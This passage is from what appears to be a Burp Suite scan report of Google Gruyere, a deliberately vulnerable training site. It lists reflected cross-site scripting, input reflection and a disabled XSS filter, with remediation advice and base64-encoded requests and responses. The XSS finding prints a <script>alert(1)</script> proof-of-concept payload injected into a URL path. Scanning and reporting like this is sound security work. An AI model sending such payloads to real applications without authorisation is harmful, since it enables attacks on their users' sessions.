N0eWxlPSd3aWR0aDoxMDAlJz48L3RleHRhcmVhPgo8L3RkPjwvdHI+CgoKPHRyPjx0ZD48L3RkPjx0ZCBhbGlnbj0nbGVmdCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBkYXRlJz4KPC90ZD48L3RyPgo8L3RhYmxlPgo8L2Zvcm0+CjwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4278767097547160576</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>kcb3e&lt;script&gt;alert(1)&lt;/script&gt;nbxck</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3Rsa2NiM2UlM2NzY3JpcHQlM2VhbGVydCgxKSUzYy9zY3JpcHQlM2VuYnhjayBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZTA1NDJlMDVjYjVlNThjZjg3OGVkMzYzOGJlYjIzOGENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MzoyMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY3NQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL2VkaXRwcm9maWxlLmd0bGtjYjNlPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pm5ieGNrPC9kaXY+CgoKPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1792273390364745728</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsaGFiZzExdHpwdCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTA5MzhmNWUwYWQzNDA0OTU3Mjk5YTJmYjgzMjEyMGMNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MzowNiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY1OQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPlVucmVjb2duaXplZCBmaWxlIHR5cGUgKC9lZGl0cHJvZmlsZS5ndGxoYWJnMTF0enB0KS48L2Rpdj4KCgo8L2JvZHk+Cgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8247327051064639488</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/lib.js]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/lib.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbGliLmpzIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2phdmFzY3JpcHQNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZGM3MWRmOWI2Nzg3OTNlMDkyMWU2MWFjM2VkOTM5NWINClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOToyNzo0OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMTk2Mg0KQ2FjaGUtQ29udHJvbDogcHVibGljLCBtYXgtYWdlPTcyMDANCkFnZTogNzIzDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwovKioKICogU3dhcHMgdGhlIGRpc3BsYXkgc2V0dGluZ3Mgb2YgdHdvIGVsZW1lbnRzLiBCZWZvcmUgY2FsbGluZywgZXhhY3RseSBvbmUKICogb2YgdGhlIHR3byBlbGVtZW50cyBzaG91bGQgaGF2ZSBzdHlsZT0iZGlzcGxheTpub25lIiBhbmQgaXQgc2hvd3MgdGhlIG9uZQogKiB0aGF0IGlzIGhpZGRlbiBhbmQgaGlkZXMgdGhlIG9uZSB0aGF0IGlzIHNob3duLgogKi8KZnVuY3Rpb24gX3Nob3dIaWRlKGlkMSwgaWQyKSB7CiAgdmFyIHgxID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQxKTsKICB2YXIgeDIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZDIpOwogIHZhciBzaG93biA9IHgxLnN0eWxlLmRpc3BsYXkgIT0gJyc7CiAgeDEuc3R5bGUuZGlzcGxheSA9IHNob3duID8gJycgOiAnbm9uZSc7CiAgeDIuc3R5bGUuZGlzcGxheSA9IHNob3duID8gJ25vbmUnIDogJyc7Cn07CgovKioKICogUmVmcmVzaGVzIHRoZSBjdXJyZW50IHBhZ2UgYnkgbG9hZGluZyB0aGUgdXJsIGFuZCB0aGVuIHBhc3NpbmcgdGhlCiAqIGpzb24gcmVzcG9uc2Ugb2JqZWN0IHRvIHRoZSBjYWxsYmFjay4KICovCmZ1bmN0aW9uIF9yZWZyZXNoKHVybCwgY2FsbGJhY2spIHsKICB2YXIgaHR0cFJlcXVlc3QgPSB3aW5kb3cuWE1MSHR0cFJlcXVlc3QgPyBuZXcgWE1MSHR0cFJlcXVlc3QoKQogICAgICA6IG5ldyBBY3RpdmVYT2JqZWN0KCJNaWNyb3NvZnQuWE1MSFRUUCIpOwogIGh0dHBSZXF1ZXN0Lm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgaWYgKGh0dHBSZXF1ZXN0LnJlYWR5U3RhdGUgPT0gNCkgewogICAgICBfZmVlZCA9IGNhbGxiYWNrOwogICAgICBldmFsKCcoJyArIGh0dHBSZXF1ZXN0LnJlc3BvbnNlVGV4dCArICcpJyk7CiAgICAgIGh0dHBSZXF1ZXN0ID0gbnVsbDsKICAgIH0KICB9CiAgaHR0cFJlcXVlc3Qub3BlbigiR0VUIiwgdXJsLCB0cnVlKTsKICBodHRwUmVxdWVzdC5zZW5kKG51bGwpOwp9OwoKLyoqCiAqIFByb2Nlc3NlcyByZWZyZXNoIHJlc3BvbnNlIHsncHJpdmF0ZV9zbmlwcGV0JzpzbmlwcGV0LCB1c2VyOnNuaXBwZXQsIC4uLn0KICovCmZ1bmN0aW9uIF9maW5pc2hSZWZyZXNoSG9tZShyZXNwb25zZSkgewogIGZvciAodmFyIHVpZCBpbiByZXNwb25zZSkgewogICAgdmFyIGVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCh1aWQpOwogICAgaWYgKGVsZW1lbnQpIHsKICAgICAgZWxlbWVudC5pbm5lckhUTUwgPSByZXNwb25zZVt1aWRdOwogICAgfQogIH0KfTsKCmZ1bmN0aW9uIF9yZWZyZXNoSG9tZSh1bmlxdWVJZCkgewogIF9yZWZyZXNoKCIvIiArIHVuaXF1ZUlkICsgIi9mZWVkLmd0bCIsIF9maW5pc2hSZWZyZXNoSG9tZSk7Cn07CgovKioKICogUHJvY2Vzc2VzIHJlZnJlc2ggcmVzcG9uc2UgW25hbWUsIHNuaXBwZXQsIC4uLl0KICovCmZ1bmN0aW9uIF9maW5pc2hSZWZyZXNoU25pcHBldHMocmVzcG9uc2UpIHsKICB2YXIgbiA9IHJlc3BvbnNlLmxlbmd0aDsKICB2YXIgZWxlbWVudCA9IGRvY3VtZW50